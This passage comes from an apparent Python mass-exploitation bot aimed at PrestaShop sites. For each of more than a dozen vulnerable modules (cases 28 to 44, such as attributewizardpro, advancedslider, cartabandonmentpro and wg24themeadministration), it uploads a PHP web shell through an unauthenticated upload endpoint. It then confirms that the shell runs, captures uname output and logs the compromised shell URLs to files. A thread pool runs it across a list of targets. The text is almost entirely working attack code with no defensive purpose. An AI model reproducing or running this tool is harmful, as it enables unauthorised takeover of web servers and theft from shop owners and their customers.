			print '[{}PrestaShoP]: {} {}	       ====> {}{} attributewizardpro.OLD     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 28 . PrestaShoP
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/1attributewizardpro/file_upload.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/1attributewizardpro/file_uploads/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} 1attributewizardpro     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/1attributewizardpro/file_uploads/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/1attributewizardpro/file_uploads/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} 1attributewizardpro     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 29 . PrestaShoP
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/attributewizardpro_x/file_upload.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/attributewizardpro_x/file_uploads/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} attributewizardpro_x     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/attributewizardpro_x/file_uploads/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/attributewizardpro_x/file_uploads/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} attributewizardpro_x     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 30 . PrestaShoP
		
		bReflexup = {'qqfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/advancedslider/ajax_advancedsliderUpload.php?action=submitUploadImage%26id_slide=php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/advancedslider/uploads/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} advancedslider     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/advancedslider/uploads/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/advancedslider/uploads/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} advancedslider     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 31 . PrestaShoP
		
		bReflexup = {'image' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/cartabandonmentpro/upload.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/cartabandonmentpro/uploads/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} cartabandonmentpro     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/cartabandonmentpro/uploads/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/cartabandonmentpro/uploads/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} cartabandonmentpro     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 32 . PrestaShoP
		
		bReflexup = {'image' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/cartabandonmentproOld/upload.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/cartabandonmentproOld/uploads/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} cartabandonmentproOld     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/cartabandonmentproOld/uploads/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/cartabandonmentproOld/uploads/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} cartabandonmentproOld     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 33 . PrestaShoP
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/videostab/ajax_videostab.php?action=submitUploadVideo%26id_product=upload', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/videostab/uploads/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} videostab     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/videostab/uploads/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/videostab/uploads/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} videostab     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 34 . PrestaShoP
		
		bReflexup = {'images[]' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/fieldvmegamenu/ajax/upload.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/fieldvmegamenu/uploads/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} fieldvmegamenu     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/fieldvmegamenu/uploads/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/fieldvmegamenu/uploads/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} fieldvmegamenu     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 35 . PrestaShoP
		
		bReflexup = {'images[]' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/orderfiles/ajax/upload.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/orderfiles/files/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} orderfiles     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/orderfiles/files/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/orderfiles/files/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} orderfiles     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 36 . PrestaShoP
		
		bReflexup = {'images[]' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/pk_flexmenu/ajax/upload.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/pk_flexmenu/uploads/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} pk_flexmenu     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/pk_flexmenu/uploads/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/pk_flexmenu/uploads/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} pk_flexmenu     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 37 . PrestaShoP
		
		bReflexup = {'images[]' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/pk_flexmenu_old/ajax/upload.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/pk_flexmenu_old/uploads/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} pk_flexmenu_old     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/pk_flexmenu_old/uploads/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/pk_flexmenu_old/uploads/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} pk_flexmenu_old     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 38 . PrestaShoP
		
		bReflexup = {'images[]' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/pk_vertflexmenu/ajax/upload.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/pk_vertflexmenu/uploads/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} pk_vertflexmenu     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/pk_vertflexmenu/uploads/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/pk_vertflexmenu/uploads/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} pk_vertflexmenu     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 39 . PrestaShoP
		
		bReflexup = {'images[]' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/nvn_export_orders/upload.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/nvn_export_orders/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} nvn_export_orders     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/nvn_export_orders/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/nvn_export_orders/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} nvn_export_orders     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 40 . PrestaShoP
		
		bReflexup = {'image_upload' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/tdpsthemeoptionpanel/tdpsthemeoptionpanelAjax.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/tdpsthemeoptionpanel/upload/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} tdpsthemeoptionpanel     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/tdpsthemeoptionpanel/upload/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/tdpsthemeoptionpanel/upload/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} tdpsthemeoptionpanel     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 41 . PrestaShoP
		
		bReflexup = {'image_upload' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/psmodthemeoptionpanel/psmodthemeoptionpanel_ajax.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/psmodthemeoptionpanel/upload/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} psmodthemeoptionpanel     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/psmodthemeoptionpanel/upload/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/mmodules/psmodthemeoptionpanel/upload/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} psmodthemeoptionpanel     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 42 . PrestaShoP
		
		bReflexup = {'file' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/lib/redactor/file_upload.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/masseditproduct/uploads/file/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} masseditproduct     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/masseditproduct/uploads/file/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/masseditproduct/uploads/file/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} masseditproduct     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 43 . PrestaShoP
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/blocktestimonial/addtestimonial.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/upload/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} blocktestimonial     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/upload/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/upload/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} blocktestimonial     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	


				
		# 44 . PrestaShoP
		
		PostData = {'data': 'bajatax','type': 'pattern_upload'}
		
		ssbReflexup = {'bajatax' : open(jceupshell, 'rb')}
		
		ssbReflexreq = requests.post(url+'/modules/wg24themeadministration/wg24_ajax.php', files=ssbReflexup, data=PostData)
		
		ssbReflexlib = requests.get(url+'/modules/wg24themeadministration/img/upload/root.php?shell')
		
		
		if 'Bigbang' in ssbReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} wg24themeadministration     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/wg24themeadministration/img/upload/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/wg24themeadministration/img/upload/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} wg24themeadministration     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)			
				
	
			
    except:
        pass


banners()

	
def Main():
    try:
		
        start = timer()
        ThreadPool = Pool(30)
        Threads = ThreadPool.map(presbot, ooo)
        print('Time: ' + str(timer() - start) + ' seconds')
    except:
        pass


if __name__ == '__main__':
    Main()    
